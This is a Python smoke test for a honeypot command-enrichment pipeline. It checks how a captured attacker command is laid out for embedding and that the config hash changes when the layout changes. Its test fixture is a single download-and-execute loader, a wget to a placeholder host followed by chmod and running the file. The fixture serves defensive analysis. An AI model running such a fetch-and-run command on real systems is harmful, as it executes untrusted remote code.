"""Smoke-test the embed_input_order knob (E8.1).

Asserts that ``_build_embed_text`` materialises the three layouts
exactly as the config knob documents:

  - prelude_first          (production default)
  - command_first
  - command_only_with_tag

Plus a fourth check that ``compute_embed_config_hash`` actually
changes when the knob flips — without this guarantee, ``reembed``
would silently keep the old vectors after a config flip.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_embed_input_order.py
"""
from __future__ import annotations

import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.config import compute_embed_config_hash, load_config
from enrich.sources.cowrie.commands import _build_embed_text


def check(name: str, ok: bool, detail: str = "") -> bool:
    sym = "✓" if ok else "✗"
    suffix = f" — {detail}" if detail else ""
    print(f"  {sym} {name}{suffix}")
    return ok


def main() -> int:
    print("=" * 72)
    print("Smoke test: embed_input_order layouts (E8.1)")
    print("=" * 72)

    cmd = "wget http://x/y -O /tmp/z && chmod +x /tmp/z && /tmp/z"
    parsed = SimpleNamespace(
        intent="malware_download",
        description="Curl-and-run loader; downloads and executes payload.",
    )
    ctx = ["intent", "description"]
    expected_head = (
        "intent: malware_download. "
        "Curl-and-run loader; downloads and executes payload."
    )

    results: list[bool] = []

    print("\n[1] prelude_first (production default)")
    out = _build_embed_text(cmd, parsed, ctx, order="prelude_first")
    expected = f"{expected_head}\nCommand: {cmd}"
    results.append(check(
        "matches '{head}\\nCommand: {cmd}'",
        out == expected,
        f"\n      got:      {out!r}\n      expected: {expected!r}" if out != expected else "",
    ))

    print("\n[2] command_first")
    out = _build_embed_text(cmd, parsed, ctx, order="command_first")
    expected = f"Command: {cmd}\n{expected_head}"
    results.append(check(
        "matches 'Command: {cmd}\\n{head}'",
        out == expected,
        f"\n      got:      {out!r}\n      expected: {expected!r}" if out != expected else "",
    ))

    print("\n[3] command_only_with_tag (drops prelude entirely)")
    out = _build_embed_text(cmd, parsed, ctx, order="command_only_with_tag")
    expected = f"[shell] {cmd}"
    results.append(check(
        "matches '[shell] {cmd}' — no head context, no cooc",
        out == expected,
        f"\n      got:      {out!r}\n      expected: {expected!r}" if out != expected else "",
    ))

    print("\n[4] command_only_with_tag ignores embed_cooccurrence too")
    # Even when cooccurring siblings would otherwise be appended, the
    # command-only layout drops them. This is the whole point of the
    # layout: test whether the command alone is enough on this corpus.
    cooc = [("ls -la", 42), ("uname -a", 30)]
    out = _build_embed_text(
        cmd, parsed, ctx,
        cooccurring=cooc, embed_cooccurrence=True,
        order="command_only_with_tag",
    )
    expected = f"[shell] {cmd}"
    results.append(check(
        "cooc siblings still dropped under command_only_with_tag",
        out == expected,
        f"\n      got:      {out!r}\n      expected: {expected!r}" if out != expected else "",
    ))

    print("\n[5] prelude_first unchanged when order is omitted (default kwarg)")
    out_default = _build_embed_text(cmd, parsed, ctx)
    out_explicit = _build_embed_text(cmd, parsed, ctx, order="prelude_first")
    results.append(check(
        "default kwarg == explicit prelude_first",
        out_default == out_explicit,
    ))

    print("\n[6] embed_config_hash changes when order flips")
    cfg = load_config()
    # Snapshot the default (prelude_first).
    h_prelude = compute_embed_config_hash(cfg)
    # Mutate in place and re-hash. Pydantic v2 models are mutable by
    # default, so we just patch the field rather than constructing a
    # whole new AppConfig.
    cfg.llm.embed_input_order = "command_first"
    h_cmd_first = compute_embed_config_hash(cfg)
    cfg.llm.embed_input_order = "command_only_with_tag"
    h_cmd_only = compute_embed_config_hash(cfg)
    cfg.llm.embed_input_order = "prelude_first"  # restore
    results.append(check(
        "prelude_first vs command_first produce distinct hashes",
        h_prelude != h_cmd_first,
        f"both={h_prelude}" if h_prelude == h_cmd_first else "",
    ))
    results.append(check(
        "command_first vs command_only_with_tag produce distinct hashes",
        h_cmd_first != h_cmd_only,
        f"both={h_cmd_first}" if h_cmd_first == h_cmd_only else "",
    ))
    results.append(check(
        "all three hashes are distinct from each other",
        len({h_prelude, h_cmd_first, h_cmd_only}) == 3,
        f"hashes={h_prelude},{h_cmd_first},{h_cmd_only}",
    ))

    print()
    print("=" * 72)
    all_ok = all(results)
    print(f"SMOKE TEST: {'PASS' if all_ok else 'FAIL'}")
    return 0 if all_ok else 1


if __name__ == "__main__":
    sys.exit(main())
